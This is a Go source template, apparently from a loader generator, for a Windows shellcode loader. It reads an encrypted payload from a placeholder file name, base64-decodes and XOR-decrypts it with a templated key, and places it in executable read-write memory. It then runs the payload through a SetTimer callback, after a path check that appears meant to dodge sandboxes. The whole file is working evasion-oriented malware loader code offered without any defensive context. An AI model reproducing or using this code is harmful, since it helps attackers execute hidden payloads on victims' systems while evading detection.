package main

import (
	"encoding/base64"
	"os"
	"syscall"
	"unsafe"
)

var (
	g_InitOnce [0]byte
	lpContext  [0]byte
)

type MSG struct {
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
	dummy                  = 0
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	ntdll            = syscall.NewLazyDLL("ntdll.dll")
	User32           = syscall.NewLazyDLL("User32.dll")
	VirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	SetTimer         = User32.NewProc("SetTimer")
	GetMessageW      = User32.NewProc("GetMessageW")
	DispatchMessageW = User32.NewProc("DispatchMessageW")
	RtlMoveMemory    = ntdll.NewProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	msg := MSG{}
	SetTimer.Call(NULL, dummy, NULL, addr)
	GetMessageW.Call((uintptr)(unsafe.Pointer(&msg)), NULL, 0, 0)
	DispatchMessageW.Call((uintptr)(unsafe.Pointer(&msg)))
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(v2 string) []byte {
	key := []byte{{{Key}}}
	v22, _ := base64.StdEncoding.DecodeString(v2)
	v222 := XorDecrypt(v22, key)
	return v222
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext, err := os.ReadFile("{{LOCAL_FILENAME}}")
	if err != nil {
		return
	}
	byteData := DecryptData(string(ciphertext))
	Callback(byteData)
}
